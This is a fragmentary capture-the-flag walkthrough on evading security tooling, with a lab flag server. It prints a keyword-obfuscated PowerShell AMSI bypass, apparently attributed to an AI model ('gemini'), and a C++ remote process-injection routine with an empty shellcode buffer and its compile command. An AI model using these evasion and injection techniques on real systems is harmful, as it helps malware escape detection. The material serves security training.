...
_Solution Walkthrough (Click to read)_  
...
Success! There are no more alerts so we now have a clean snippet that we can use! Submit this clean code snippet to `http://10.81.191.237` and obtain the flag.

#### Solution 2 - gemini


```
# We use variable splitting, ticks, and reordering to hide the keywords
$a = 'System.Management.Automation.' + 'A' + 'msi' + 'Utils'
$b = "a`m`siI`nitF`ailed"
$c = "{1}{0}" -f 'Static', 'NonPublic,'
...
_Challenge Code Snippet (Click to view)_
...
int main(int argc, char* argv[])
{
    // Keeping the shellcode empty as per the original snippet
    unsigned char a1x[] = ""; 
    ...
    // Use atoi(argv[1]) to get the PID from the command line argument
    if (argc < 2) return 1;

    h1 = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
    b1 = VirtualAllocEx(h1, NULL, sizeof a1x, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(h1, b1, a1x, sizeof a1x, NULL);
    h2 = CreateRemoteThread(h1, NULL, 0, (LPTHREAD_START_ROUTINE)b1, NULL, 0, NULL);
    CloseHandle(h1);
...
```
i686-w64-mingw32-g++ challenge-8.cpp -o challenge-8.exe -s -lkernel32
```
